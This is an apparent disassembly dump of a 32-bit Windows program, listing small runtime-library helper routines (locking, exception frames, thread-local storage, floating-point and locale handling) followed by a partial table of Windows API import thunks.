pop ebp
retn
sub_4c169c
push ebp
mov ebp esp
mov ax 0xffff
pop ebp
retn
sub_4c18d8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
pop ebp
retn
sub_4c18e0
push ebp
mov ebp esp
xor eax eax
pop ebp
retn
sub_4c18e8
push ebp
mov ebp esp
pop ebp
retn
sub_4c204a
mov [ ebp - 0x3c ] 0x0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4c285e
mov [ ebp - 0x3c ] 0x0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4c3454
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
call sub_4c517c
xor eax eax
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
mov esp ebp
pop ebp
retn
sub_4c3474
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
call sub_4c517c
mov eax 0x2
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
mov esp ebp
pop ebp
retn
sub_4c3498
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
call sub_4c517c
xor eax eax
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
mov esp ebp
pop ebp
retn
sub_4c38b0
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x14 ] 0xc
inc [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
mov esp ebp
pop ebp
retn
sub_4c3aa0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
push edx
call EnterCriticalSection
pop ebp
retn
sub_4c3ab0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
push edx
call LeaveCriticalSection
pop ebp
retn
sub_4c3b58
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax [ rw-data ]
jge r-xdata
pop ebp
retn
shl eax 0x2
add eax rw-data
push eax
call sub_4c3ab0
pop ecx
sub_4c3b78
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
call sub_4d0044
pop ecx
pop ebp
retn
sub_4c3b88
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
call sub_4d0054
pop ecx
pop ebp
retn
sub_4c3fa0
push rw-data
call LoadLibraryA
cmp eax [ rw-data ]
je r-xdata
retn
push rw-data
call sub_4cec84
pop ecx
sub_4c421c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
call [ rw-data ]
sub_4c4230
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
call [ rw-data ]
pop ebp
retn
sub_4c4284
call [ rw-data ]
retn
sub_4c42ac
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push eax
mov edx [ ebp + 0x8 ]
push edx
call [ rw-data ]
add esp 0x8
pop ebp
retn
sub_4c430c
push ebp
mov ebp esp
push 0x1
call sub_4c42c4
pop ecx
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
pop ecx
pop ebp
retn
sub_4c4324
push ebp
mov ebp esp
push 0x1
call sub_4c42c4
pop ecx
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
pop ecx
pop ebp
retn
sub_4c435c
retn
sub_4c4360
mov [ rw-data ] 0x1
retn
sub_4c436c
cmp [ rw-data ] 0x0
je r-xdata
retn
call [ rw-data ]
sub_4c437c
retn
sub_4c4380
xor eax eax
retn
sub_4c4418
retn
sub_4c4810
push ebx
call sub_4475f4
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
mov eax [ ebx ]
call sub_447600
push ebx
call sub_4c429c
pop ecx
sub_4c4c4c
retn
j_sub_4c4d44
jmp sub_4c4d44
j_sub_4c506c
jmp sub_4c506c
j_sub_4c506c#2
jmp sub_4c506c
sub_4c51b5
mov [ fs : 0x0 ] eax
retn
sub_4c56a1
push rw-data
call sub_4088ac
pop ecx
mov eax rw-data
mov [ rw-data ] eax
push rw-data
call sub_4088ac
pop ecx
mov edx rw-data
mov [ rw-data ] edx
retn
sub_4c56cd
push 0x0
push rw-data
call sub_4b0264
add esp 0x8
push 0x0
push rw-data
call sub_4b0264
add esp 0x8
retn
sub_4c5c60
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] sub_4b0204
retn
mov [ rw-data ] sub_4b021c
sub_4c5c88
push rw-data
push 0x0
call GetModuleHandleA
push eax
call GetProcAddress
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
retn
mov [ rw-data ] ___CPPdebugHook
sub_4c5da8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
call sub_4015fc
add eax 0x64
mov [ rw-data ] eax
mov [ ebx ] 0x82727349
mov [ ebx + 0x4 ] rw-data
pop ebx
pop ebp
retn
sub_4c5dd0
push ebp
mov ebp esp
mov eax 0x1
pop ebp
retn
sub_4c5ef8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] sub_4c5dfc
push eax
call sub_4c5f84
pop ecx
pop ebp
retn
sub_4c5f14
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
call sub_4c5f99
pop ecx
pop ebp
retn
sub_4c5f24
push ebp
mov ebp esp
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
mov [ rw-data ] edx
pop ebp
retn
sub_4c5f38
mov [ rw-data ] sub_4c5dd0
retn
sub_4c5f44
mov [ rw-data ] sub_4c5dd0
mov [ rw-data ] sub_4c5dd0
retn
sub_4c5f5c
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
push eax
call sub_4c5f14
pop ecx
sub_4c5f70
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
push eax
call sub_4c5ef8
pop ecx
sub_4c5f84
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ fs : 0x0 ]
mov [ eax ] ecx
mov [ fs : 0x0 ] eax
pop ebp
retn
sub_4c5fc5
jmp RtlUnwind
sub_4c5fcc
mov esp ebx
mov ebp ecx
jmp eax
sub_4c5fd2
push ebx
push esi
push edi
push 0x0
push edx
push r-xdata
push eax
call RtlUnwind
pop edi
pop esi
pop ebx
retn
sub_4c5fe7
push ebp
mov ebp ecx
call [ ebx ]
pop ebp
retn
sub_4c5fee
test eax eax
je r-xdata
retn
mov edx 0x1
mov ecx [ eax ]
call [ ecx - 0x4 ]
sub_4c6038
pop ebx
pop ebp
retn
sub_4c6180
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
call GetFileType
cmp eax 0x2
sete al
and eax 0x1
pop ebp
retn
sub_4c66f8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
mov [ eax ] 0x0
sub_4c6768
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push eax
mov edx [ ebp + 0xc ]
push edx
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4c6288
add esp 0xc
pop ebp
retn
sub_4c67cc
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push eax
mov edx [ ebp + 0xc ]
push edx
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4c65c4
add esp 0xc
pop ebp
retn
j_sub_4c6000
jmp sub_4c6000
sub_4c6a24
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_4c6a34
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
mov eax [ eax ]
mov [ rw-data ] eax
sub_4c6c90
push ebp
mov ebp esp
push 0x0
mov eax [ ebp + 0xc ]
mov edx [ eax ]
push edx
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4c6b8c
add esp 0xc
pop ebp
retn
sub_4c6cf4
mov eax [ rw-data ]
push eax
call sub_4cffe8
pop ecx
retn
sub_4c6d04
mov eax [ rw-data ]
test eax eax
je r-xdata
mov [ rw-data ] 0x1
retn
push eax
call sub_4c429c
pop ecx
xor edx edx
mov [ rw-data ] edx
sub_4c6d28
mov eax [ rw-data ]
push eax
call sub_4cfff8
pop ecx
retn
sub_4c6edc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax [ rw-data ]
jae r-xdata
pop ebp
retn
xor edx edx
mov [ eax * 4 + rw-data ] edx
sub_4c7158
push ebx
call GetLastError
mov ebx eax
and ebx 0xffff
mov eax ebx
and eax 0xffff
push eax
call sub_4c710c
pop ecx
mov eax ebx
pop ebx
retn
sub_4c7178
call GetLastError
and eax 0xffff
push eax
call sub_4c710c
pop ecx
retn
sub_4c7230
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x8 ]
inc edx
mov [ eax + 0x8 ] edx
push eax
call sub_4c9e4c
pop ecx
pop ebp
retn
sub_4c72cf
pop ebx
pop ebp
retn
sub_4c73dc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x8 ]
add edx 0x2
mov [ eax + 0x8 ] edx
push eax
call sub_4c9e74
pop ecx
pop ebp
retn
sub_4c7483
pop ebx
pop ebp
retn
sub_4c8590
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
dec [ eax ]
pop ebp
retn
sub_4c8704
mov eax [ rw-data ]
push eax
call sub_4cffe8
pop ecx
retn
sub_4c8714
mov eax [ rw-data ]
push eax
call sub_4cfff8
pop ecx
retn
sub_4c87c8
mov eax [ rw-data ]
test eax eax
je r-xdata
mov [ rw-data ] 0x1
retn
push eax
call sub_4c429c
pop ecx
xor edx edx
mov [ rw-data ] edx
sub_4c8944
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
call DeleteFileA
dec eax
jne r-xdata
call sub_4c7178
xor eax eax
jmp r-xdata
pop ebp
retn
sub_4ca214
push ebp
mov ebp esp
push 0x104
mov eax [ ebp + 0x8 ]
push eax
call sub_4ca41c
add esp 0x8
pop ebp
retn
sub_4ca22c
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x80
setb al
and eax 0x1
pop ebp
retn
sub_4ca240
push ebp
mov ebp esp
push 0x100
mov eax [ ebp + 0x8 ]
push eax
call sub_4ca41c
add esp 0x8
pop ebp
retn
sub_4ca258
push ebp
mov ebp esp
push 0x20
mov eax [ ebp + 0x8 ]
push eax
call sub_4ca41c
add esp 0x8
pop ebp
retn
sub_4ca26c
push ebp
mov ebp esp
push 0x4
mov eax [ ebp + 0x8 ]
push eax
call sub_4ca41c
add esp 0x8
pop ebp
retn
sub_4ca280
push ebp
mov ebp esp
push 0x194
mov eax [ ebp + 0x8 ]
push eax
call sub_4ca41c
add esp 0x8
pop ebp
retn
sub_4ca298
push ebp
mov ebp esp
push 0x2
mov eax [ ebp + 0x8 ]
push eax
call sub_4ca41c
add esp 0x8
pop ebp
retn
sub_4ca2ac
push ebp
mov ebp esp
push 0x1d4
mov eax [ ebp + 0x8 ]
push eax
call sub_4ca41c
add esp 0x8
pop ebp
retn
sub_4ca2c4
push ebp
mov ebp esp
push 0x10
mov eax [ ebp + 0x8 ]
push eax
call sub_4ca41c
add esp 0x8
pop ebp
retn
sub_4ca2d8
push ebp
mov ebp esp
push 0x8
mov eax [ ebp + 0x8 ]
push eax
call sub_4ca41c
add esp 0x8
pop ebp
retn
sub_4ca2ec
push ebp
mov ebp esp
push 0x1
mov eax [ ebp + 0x8 ]
push eax
call sub_4ca41c
add esp 0x8
pop ebp
retn
sub_4ca300
push ebp
mov ebp esp
push 0x80
mov eax [ ebp + 0x8 ]
push eax
call sub_4ca41c
add esp 0x8
pop ebp
retn
sub_4ca318
push ebp
mov ebp esp
push 0x104
movzx eax [ ebp + 0x8 ]
push eax
call sub_4ca460
add esp 0x8
pop ebp
retn
sub_4ca330
push ebp
mov ebp esp
movzx eax [ ebp + 0x8 ]
cmp eax 0x80
setb al
and eax 0x1
pop ebp
retn
sub_4ca344
push ebp
mov ebp esp
push 0x100
movzx eax [ ebp + 0x8 ]
push eax
call sub_4ca460
add esp 0x8
pop ebp
retn
sub_4ca35c
push ebp
mov ebp esp
push 0x20
movzx eax [ ebp + 0x8 ]
push eax
call sub_4ca460
add esp 0x8
pop ebp
retn
sub_4ca370
push ebp
mov ebp esp
push 0x4
movzx eax [ ebp + 0x8 ]
push eax
call sub_4ca460
add esp 0x8
pop ebp
retn
sub_4ca384
push ebp
mov ebp esp
push 0x194
movzx eax [ ebp + 0x8 ]
push eax
call sub_4ca460
add esp 0x8
pop ebp
retn
sub_4ca39c
push ebp
mov ebp esp
push 0x2
movzx eax [ ebp + 0x8 ]
push eax
call sub_4ca460
add esp 0x8
pop ebp
retn
sub_4ca3b0
push ebp
mov ebp esp
push 0x1d4
movzx eax [ ebp + 0x8 ]
push eax
call sub_4ca460
add esp 0x8
pop ebp
retn
sub_4ca3c8
push ebp
mov ebp esp
push 0x10
movzx eax [ ebp + 0x8 ]
push eax
call sub_4ca460
add esp 0x8
pop ebp
retn
sub_4ca3dc
push ebp
mov ebp esp
push 0x8
movzx eax [ ebp + 0x8 ]
push eax
call sub_4ca460
add esp 0x8
pop ebp
retn
sub_4ca3f0
push ebp
mov ebp esp
push 0x1
movzx eax [ ebp + 0x8 ]
push eax
call sub_4ca460
add esp 0x8
pop ebp
retn
sub_4ca404
push ebp
mov ebp esp
push 0x80
movzx eax [ ebp + 0x8 ]
push eax
call sub_4ca460
add esp 0x8
pop ebp
retn
sub_4caa74
mov eax [ rw-data ]
push eax
call EnterCriticalSection
retn
sub_4caa8c
push ebx
push 0x18
call sub_4c428c
pop ecx
mov ebx eax
mov [ rw-data ] ebx
push ebx
call InitializeCriticalSection
pop ebx
retn
sub_4cbecc
push ebp
mov ebp esp
mov eax 0x1
pop ebp
retn
sub_4cc13b
pop ebp
retn
sub_4cc334
pop ebp
retn
sub_4cc39b
pop ecx
pop ebp
retn
sub_4cc40e
pop ecx
pop ebp
retn
sub_4cc7b9
pop ebp
retn
j_sub_4cd0c0
jmp sub_4cd0c0
sub_4ccbb8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
call sub_4ccb50
pop ecx
pop ebp
retn
sub_4ccbc8
push ebp
mov ebp esp
lea esp [ ebp - 0x2 ]
fnstsw [ ebp - 0x2 ]
fnclex
movzx eax [ ebp - 0x2 ]
mov esp ebp
pop ebp
retn
j_sub_4ccc3c
jmp [ rw-data ]
j_sub_4ccc3c#2
jmp [ rw-data ]
j_sub_4ccc48#2
jmp [ rw-data ]
j_sub_4ccc48
jmp [ rw-data ]
j_sub_4ccc54
jmp [ rw-data ]
sub_4ccc3c
push rw-data
call sub_4cec84
pop ecx
retn
sub_4ccc48
push rw-data
call sub_4cec84
pop ecx
retn
sub_4ccc54
push rw-data
call sub_4cec84
pop ecx
retn
sub_4ccc60
push rw-data
call sub_4cec84
pop ecx
retn
sub_4ccc6c
push ebp
mov ebp esp
fld [ ebp + 0x8 ]
mov ax [ ebp + 0xe ]
shl ax 0x1
cmp ax 0x8680
ja r-xdata
pop ebp
retn
mov ch 0x4
call sub_4cd7e8
sub_4ccc88
fninit
push 0x1fff
push [ rw-data ]
call sub_4ccbdc
add esp 0x8
retn
sub_4ccd24
mov eax [ esp + 0x4 ]
fld [ eax ]
fxam
xor eax eax
fwait
fnstsw ax
fstp st0
fwait
retn
sub_4cd144
push ebp
mov ebp esp
mov [ rw-data ] sub_4cd0e8
mov [ rw-data ] sub_4cd114
pop ebp
retn
sub_4cd484
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x0
mov eax [ ebp + 0x8 ]
je r-xdata
add eax 0x8
add eax 0xc
jmp r-xdata
pop ebp
retn
sub_4cd49c
mov [ rw-data ] sub_4cd1fc
mov [ rw-data ] sub_4cd484
retn
sub_4cd7b8
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x0
mov eax [ ebp + 0x8 ]
je r-xdata
add eax 0x8
add eax 0xc
jmp r-xdata
pop ebp
retn
sub_4cd7d0
mov [ rw-data ] sub_4cd500
mov [ rw-data ] sub_4cd7b8
retn
sub_4cdce8
mov [ rw-data ] sub_4cd814
mov [ rw-data ] sub_4cdc68
retn
sub_4ce1d4
mov [ rw-data ] sub_4cdd00
mov [ rw-data ] sub_4ce154
retn
sub_4ce8ec
mov eax [ rw-data ]
retn
sub_4ce8f4
call GetACP
push eax
call sub_4ce7b4
pop ecx
retn
sub_4ceafc
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov [ eax ] 0x1
xor eax eax
pop ebp
retn 0x8
sub_4cec74
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
call sub_4ceb58
pop ecx
pop ebp
retn
sub_4cec9c
push ebp
mov ebp esp
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
mov [ rw-data ] edx
pop ebp
retn
sub_4cecb0
push rw-data
call sub_4ceb58
pop ecx
push 0x3
call sub_4cedc0
pop ecx
retn
sub_4ced07
cmp [ ebp - 0x10 ] 0x40000015
sete al
and eax 0x1
retn
sub_4ced34
push 0x16
call sub_4cf8f0
pop ecx
call sub_4cecc4
retn
sub_4ced44
retn
sub_4ceda8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
push 0x0
push 0x0
call sub_4ced48
add esp 0xc
pop ebp
retn
sub_4cedc0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
push 0x0
push 0x1
call sub_4ced48
add esp 0xc
pop ebp
retn
sub_4cedd8
push 0x0
push 0x1
push 0x0
call sub_4ced48
add esp 0xc
retn
sub_4cede8
push 0x0
push 0x1
push 0x1
call sub_4ced48
add esp 0xc
retn
sub_4cedf8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx [ eax ]
mov [ rw-data ] edx
mov eax [ ecx ]
mov [ rw-data ] eax
pop ebp
retn
sub_4cee14
push ebp
mov ebp esp
push 0x0
mov eax [ ebp + 0x8 ]
push eax
call [ ebp + 0xc ]
add esp 0x8
pop ebp
retn
sub_4cee28
push ebp
mov ebp esp
push 0x0
mov eax [ ebp + 0x8 ]
push eax
call [ ebp + 0xc ]
add esp 0x8
pop ebp
retn
sub_4cee3c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ rw-data ] eax
mov [ rw-data ] edx
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0x14 ]
mov [ rw-data ] ecx
mov [ rw-data ] eax
pop ebp
retn
sub_4cf128
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
push eax
call sub_4c429c
pop ecx
xor edx edx
mov [ rw-data ] edx
sub_4cf34c
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
push eax
call sub_4c429c
pop ecx
xor edx edx
mov [ rw-data ] edx
sub_4cf418
mov eax [ rw-data ]
push eax
call sub_4c429c
pop ecx
retn
sub_4cf428
mov eax [ rw-data ]
push eax
call sub_4cffe8
pop ecx
retn
sub_4cf438
mov eax [ rw-data ]
push eax
call sub_4cfff8
pop ecx
retn
sub_4cf988
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
call ExitProcess
sub_4cf998
xor eax eax
retn
sub_4cf99c
xor eax eax
retn
sub_4cfae0
mov eax [ rw-data ]
push eax
call sub_4cffe8
pop ecx
retn
sub_4cfaf0
mov eax [ rw-data ]
push eax
call sub_4cfff8
pop ecx
retn
sub_4cfb00
push rw-data
push rw-data
call sub_4cff84
add esp 0x8
retn
sub_4cfc98
add esp 0xffffffbc
push esp
call GetStartupInfoA
test [ esp + 0x2c ] 0x1
je r-xdata
mov eax 0xa
movzx eax [ esp + 0x30 ]
jmp r-xdata
add esp 0x44
retn
sub_4cfcb8
call sub_4015fc
mov eax [ eax + 0xe8 ]
retn
sub_4cfcc4
call sub_4015fc
mov eax [ eax + 0xe4 ]
retn
sub_4cfd20
call TlsAlloc
retn
sub_4cfd28
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
call TlsFree
pop ebp
retn 0x4
sub_4cfd38
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
call TlsGetValue
pop ebp
retn 0x4
sub_4cfd48
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push eax
mov edx [ ebp + 0x8 ]
push edx
call TlsSetValue
pop ebp
retn 0x8
sub_4cfd5c
push ebp
mov ebp esp
pop ebp
retn 0x4
sub_4cfd64
push ebp
mov ebp esp
pop ebp
retn 0x4
sub_4cfd6c
xor eax eax
retn
sub_4cfdac
push ebx
call sub_4015fc
mov ebx [ eax + 0xe8 ]
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_4cfdd4
mov ebx eax
call sub_4015fc
mov [ eax + 0xe8 ] ebx
sub_4cfeb0
push rw-data
push rw-data
call sub_4cff84
add esp 0x8
retn
sub_4cffe8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
call EnterCriticalSection
pop ebp
retn
sub_4cfff8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
call LeaveCriticalSection
pop ebp
retn
sub_4d0044
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
call InterlockedIncrement
pop ebp
retn
sub_4d0054
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
call InterlockedDecrement
pop ebp
retn
sub_4d0064
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
inc eax
pop ebp
retn
sub_4d0070
push rw-data
call InitializeCriticalSection
mov [ rw-data ] 0x1
retn
sub_4d0088
push rw-data
push 0x0
call GetModuleHandleA
push eax
call GetProcAddress
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
retn
mov [ rw-data ] ___CPPdebugHook
sub_4d1c18
mov esp ebx
mov ebp ecx
jmp eax
sub_4d1e85
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4d1eac
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ rw-data ] eax
mov [ rw-data ] edx
pop ebp
retn
sub_4d1ec4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ rw-data ] eax
mov [ rw-data ] edx
pop ebp
retn
sub_4d25a0
call sub_4015fc
add eax 0x48
retn
sub_4d2758
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
mov edx [ edx ]
call sub_44939c
mov eax esi
pop esi
pop ebx
pop ebp
retn
sub_4d27b4
push ebp
mov ebp esp
push ebx
mov eax [ eax ]
mov edx [ edx ]
call sub_4497bc
sete al
and eax 0x1
pop ebx
pop ebp
retn
sub_4d27cc
push ebp
mov ebp esp
push ebx
mov eax [ eax ]
mov edx [ edx ]
call sub_4497bc
setne al
and eax 0x1
pop ebx
pop ebp
retn
sub_4d2d64
push ebp
mov ebp esp
call sub_4016d4
pop ebp
retn
sub_4d2e2c
push ebp
mov ebp esp
call sub_437868
pop ebp
retn
sub_4d2f60
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
add eax 0xfffffff4
pop ebp
retn
sub_4d324c
push ebp
mov ebp esp
call sub_41e67c
pop ebp
retn
sub_4d327c
push ebp
mov ebp esp
call sub_41e694
pop ebp
retn
sub_4d3340
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call j_sub_44a5d8#2
mov eax ebx
pop ebx
pop ebp
retn
sub_4d3380
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_41e644
mov eax ebx
pop ebx
pop ebp
retn
sub_4d3394
push ebp
mov ebp esp
call sub_41e64c
pop ebp
retn
sub_4d369c
push edx
push ecx
call [ eax - 0xc ]
pop ecx
pop edx
retn
sub_4d36a4
mov edx [ eax ]
jmp [ edx - 0x8 ]
sub_4d36a9
push eax
mov edx [ eax ]
call [ edx - 0x1c ]
pop eax
retn
sub_4d36b1
test dl dl
jg r-xdata
push eax
push edx
mov edx [ eax ]
call [ edx - 0x18 ]
pop edx
pop eax
retn
retn
sub_4d36c0
sub esp 0x8
fld [ esp + 0xc ]
fistp [ esp ]
pop eax
pop edx
retn
sub_4d36cd
push ebp
mov ebp esp
fild [ eax ]
fild [ ebp + 0x8 ]
fmulp st1
fidiv [ rw-data ]
fistp [ eax ]
fwait
pop ebp
retn 0x8
DirectInputCreateA
jmp [ DirectInputCreateA@IAT ]
RegCloseKey
jmp [ RegCloseKey@IAT ]
RegFlushKey
jmp [ RegFlushKey@IAT ]
RegOpenKeyExW
jmp [ RegOpenKeyExW@IAT ]
RegQueryValueExW
jmp [ RegQueryValueExW@IAT ]
CloseHandle
jmp [ CloseHandle@IAT ]
CompareStringW
jmp [ CompareStringW@IAT ]
CreateEventW
jmp [ CreateEventW@IAT ]
CreateFileA
jmp [ CreateFileA@IAT ]
CreateFileW
jmp [ CreateFileW@IAT ]
CreateMutexA
jmp [ CreateMutexA@IAT ]
CreateThread
jmp [ CreateThread@IAT ]
DeleteCriticalSection
jmp [ DeleteCriticalSection@IAT ]
DeleteFileA
jmp [ DeleteFileA@IAT ]
EnumCalendarInfoA
jmp [ EnumCalendarInfoA@IAT ]
ExitProcess
jmp [ ExitProcess@IAT ]
ExitThread
jmp [ ExitThread@IAT ]
FindClose
jmp [ FindClose@IAT ]
FindFirstFileA
jmp [ FindFirstFileA@IAT ]
FindFirstFileW
jmp [ FindFirstFileW@IAT ]
FindNextFileA
jmp [ FindNextFileA@IAT ]
FindResourceW
jmp [ FindResourceW@IAT ]
FormatMessageA
jmp [ FormatMessageA@IAT ]
FormatMessageW
jmp [ FormatMessageW@IAT ]
FreeLibrary
jmp [ FreeLibrary@IAT ]
FreeResource
jmp [ FreeResource@IAT ]
GetACP
jmp [ GetACP@IAT ]
GetCPInfo
jmp [ GetCPInfo@IAT ]
GetCommandLineA
jmp [ GetCommandLineA@IAT ]
GetCommandLineW
jmp [ GetCommandLineW@IAT ]
GetCurrentProcess
jmp [ GetCurrentProcess@IAT ]
GetCurrentProcessId
jmp [ GetCurrentProcessId@IAT ]
GetCurrentThread
jmp [ GetCurrentThread@IAT ]
GetCurrentThreadId
jmp [ GetCurrentThreadId@IAT ]
GetDateFormatW
jmp [ GetDateFormatW@IAT ]
GetDiskFreeSpaceW
jmp [ GetDiskFreeSpaceW@IAT ]
GetEnvironmentStrings
jmp [ GetEnvironmentStrings@IAT ]
GetExitCodeThread
jmp [ GetExitCodeThread@IAT ]
GetFileAttributesA
jmp [ GetFileAttributesA@IAT ]
GetFileType
jmp [ GetFileType@IAT ]
GetFullPathNameW
jmp [ GetFullPathNameW@IAT ]
GetLastError
jmp [ GetLastError@IAT ]
GetLocalTime
jmp [ GetLocalTime@IAT ]
GetLocaleInfoA
jmp [ GetLocaleInfoA@IAT ]
GetLocaleInfoW
jmp [ GetLocaleInfoW@IAT ]
GetModuleFileNameA
jmp [ GetModuleFileNameA@IAT ]
GetModuleFileNameW
jmp [ GetModuleFileNameW@IAT ]
GetModuleHandleA
jmp [ GetModuleHandleA@IAT ]
GetModuleHandleW
jmp [ GetModuleHandleW@IAT ]
GetOEMCP
jmp [ GetOEMCP@IAT ]
GetPrivateProfileStringW
jmp [ GetPrivateProfileStringW@IAT ]
GetProcAddress
jmp [ GetProcAddress@IAT ]
GetProcessHeap
jmp [ GetProcessHeap@IAT ]
GetStartupInfoA
jmp [ GetStartupInfoA@IAT ]
GetStdHandle
jmp [ GetStdHandle@IAT ]
GetStringTypeA
jmp [ GetStringTypeA@IAT ]
GetStringTypeW
jmp [ GetStringTypeW@IAT ]
GetSystemDefaultLangID
jmp [ GetSystemDefaultLangID@IAT ]
GetSystemInfo
jmp [ GetSystemInfo@IAT ]
GetThreadLocale
jmp [ GetThreadLocale@IAT ]
GetTickCount
jmp [ GetTickCount@IAT ]
GetUserDefaultLCID
jmp [ GetUserDefaultLCID@IAT ]
GetVersion
jmp [ GetVersion@IAT ]
GetVersionExA
jmp [ GetVersionExA@IAT ]
GetVersionExW
jmp [ GetVersionExW@IAT ]
GlobalAddAtomW
jmp [ GlobalAddAtomW@IAT ]
GlobalDeleteAtom
jmp [ GlobalDeleteAtom@IAT ]
GlobalFindAtomW
jmp [ GlobalFindAtomW@IAT ]
HeapAlloc
jmp [ HeapAlloc@IAT ]
HeapFree
jmp [ HeapFree@IAT ]
InitializeCriticalSection
jmp [ InitializeCriticalSection@IAT ]
InterlockedCompareExchange
jmp [ InterlockedCompareExchange@IAT ]
InterlockedDecrement
jmp [ InterlockedDecrement@IAT ]
InterlockedExchange
jmp [ InterlockedExchange@IAT ]
InterlockedExchangeAdd
jmp [ InterlockedExchangeAdd@IAT ]
InterlockedIncrement
jmp [ InterlockedIncrement@IAT ]
IsDBCSLeadByteEx
jmp [ IsDBCSLeadByteEx@IAT ]
IsDebuggerPresent
jmp [ IsDebuggerPresent@IAT ]
IsValidLocale
jmp [ IsValidLocale@IAT ]
LCMapStringA
jmp [ LCMapStringA@IAT ]
LoadLibraryA
jmp [ LoadLibraryA@IAT ]
LoadLibraryExW
jmp [ LoadLibraryExW@IAT ]
LoadLibraryW
jmp [ LoadLibraryW@IAT ]
LoadResource
jmp [ LoadResource@IAT ]
LocalFree
jmp [ LocalFree@IAT ]
LockResource
jmp [ LockResource@IAT ]
MoveFileA
jmp [ MoveFileA@IAT ]
MulDiv
jmp [ MulDiv@IAT ]
MultiByteToWideChar
jmp [ MultiByteToWideChar@IAT ]
OpenMutexA
jmp [ OpenMutexA@IAT ]
OpenProcess
